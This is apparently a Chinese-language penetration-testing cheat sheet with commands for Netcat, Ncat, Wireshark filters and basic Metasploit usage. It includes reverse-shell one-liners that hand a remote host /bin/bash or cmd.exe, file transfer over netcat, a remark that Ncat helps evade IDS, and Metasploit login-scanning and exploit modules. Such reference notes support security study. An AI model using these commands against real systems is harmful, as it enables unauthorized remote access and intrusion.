1.3 Netcat

读写TCP和UDP数据包

  • 连接到POP3邮件服务器
    nc -nv $ip 110
  • 侦听TCP / UDP端口
    nc -nlvp 4444
  • 连接到netcat端口
    nc -nv $ip 4444
  • 使用netcat发送文件
    nc -nv $ip 4444 < /usr/share/windows-binaries/wget.exe
  • 使用netcat接收文件
    nc -nlvp 4444 > incoming.exe
  • 在Linux上使用bash使用Ncat创建反向Shell
    nc -nv $ip 4444 -e /bin/bash

1.4 Ncat

用于Nmap的Netcat项目，可提供更高的安全性，避免IDS

  • 使用SSL使用cmd.exe从Windows反转外壳
    ncat --exec cmd.exe --allow $ip -vnl 4444 --ssl
  • 使用SSL侦听端口4444
    ncat -v $ip 4444 --ssl

1.5 Wireshark

  • 仅显示SMTP（端口25）和ICMP流量：

    tcp.port eq 25 or icmp

  • 仅显示工作站和服务器之间的LAN（192.168.xx）中的流量-无Internet：

    ip.src==192.168.0.0/16 and ip.dst==192.168.0.0/16

  • 按协议过滤（例如SIP）并过滤掉不需要的IP：

    ip.src != xxx.xxx.xxx.xxx && ip.dst != xxx.xxx.xxx.xxx && sip

  • 有些命令是相等的

    ip.addr == xxx.xxx.xxx.xxx

    等于

    ip.src == xxx.xxx.xxx.xxx or ip.dst == xxx.xxx.xxx.xxx

    ip.addr != xxx.xxx.xxx.xxx

    等于

    ip.src != xxx.xxx.xxx.xxx or ip.dst != xxx.xxx.xxx.xxx

    • Hydra SSH using a known password and a username list

  • MSF语法

    • 开始metasploit

      msfconsole

      msfconsole -q

    • 显示命令帮助

      show -h

    • 显示辅助模块

      show auxiliary

    • 使用模块

      use auxiliary/scanner/snmp/snmp_enum  
use auxiliary/scanner/http/webdav_scanner  
use auxiliary/scanner/smb/smb_version  
use auxiliary/scanner/ftp/ftp_login  
use exploit/windows/pop3/seattlelab_pass

    • 显示模块的基本信息

      info

    • 显示模块的配置参数

      show options

    • 设置模块的选项

      set RHOSTS 192.168.1.1-254  
set THREADS 10

    • 运行模块

      run

    • 执行漏洞利用

      exploit

    • 搜索模块

      search type:auxiliary login

      hosts
